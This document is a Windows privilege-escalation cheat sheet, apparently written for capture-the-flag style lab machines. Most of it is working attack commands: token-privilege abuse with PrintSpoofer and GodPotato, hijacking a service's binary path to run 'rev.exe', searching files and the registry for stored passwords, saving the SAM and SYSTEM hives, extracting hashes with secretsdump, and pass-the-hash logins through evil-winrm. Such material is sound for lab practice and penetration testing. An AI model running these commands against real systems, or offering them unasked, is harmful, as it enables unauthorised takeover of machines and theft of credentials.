# Windows privilege escalation

## Manual sweep

```powershell
whoami /all                        # groups AND privileges — read this carefully
systeminfo
net user; net localgroup administrators
Get-LocalUser; Get-LocalGroup
ipconfig /all; netstat -ano
Get-ChildItem C:\Users -Force
Get-Process | Select Name,Path
```

## Token privileges (`whoami /priv`)

The fastest wins on Windows lab boxes:

| Privilege | Exploit |
|-----------|---------|
| SeImpersonatePrivilege | PrintSpoofer / GodPotato / JuicyPotato — instant SYSTEM |
| SeAssignPrimaryToken | same potato family |
| SeBackupPrivilege | read SAM+SYSTEM hives, dump hashes offline |
| SeRestorePrivilege | overwrite a system binary or service DLL |
| SeDebugPrivilege | inject into a SYSTEM process, or dump lsass |
| SeTakeOwnership | take a protected file, then rewrite it |
| SeLoadDriver | load a vulnerable driver |

```powershell
.\PrintSpoofer64.exe -i -c cmd
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

## Service misconfigurations

```powershell
# unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
# weak service permissions
accesschk.exe -uwcqv "Authenticated Users" *
sc qc <service>; sc config <service> binPath= "C:\temp\rev.exe"; sc stop <service>; sc start <service>
```
Also check for writable directories in a service binary's path, and writable
DLLs it loads (DLL hijack).

## Credentials on disk

```powershell
Get-ChildItem -Path C:\ -Include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
type C:\Windows\Panther\Unattend.xml
cmdkey /list
reg query HKLM /f password /t REG_SZ /s
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
Get-ChildItem -Recurse -Force C:\Users\*\AppData\Roaming\Microsoft\Credentials
```
PowerShell history is a reliable hit:
```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## AlwaysInstallElevated

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Both set to 1 → any MSI you write runs as SYSTEM.

## Scheduled tasks

```powershell
schtasks /query /fo LIST /v | findstr /i "taskname task to run run as"
```
A task running as SYSTEM whose script you can write is the same win as a Linux
cron.

## Hash extraction

```powershell
reg save HKLM\SAM sam.hiv; reg save HKLM\SYSTEM sys.hiv     # needs SeBackup or admin
```
```bash
htb x "impacket-secretsdump -sam sam.hiv -system sys.hiv LOCAL"
htb x "evil-winrm -i $T -u Administrator -H <nthash>"        # pass-the-hash
```

## Backstop

```
winPEASx64.exe log     # staged in /opt/static
```
Read its "interesting" sections rather than the whole dump; treat it as a
checklist confirmation, not a substitute for `whoami /priv`.

## Domain-joined?

If the host is in a domain, stop treating it as a standalone box and switch to
`references/ad.md` — the escalation is usually a domain path, not a local one.
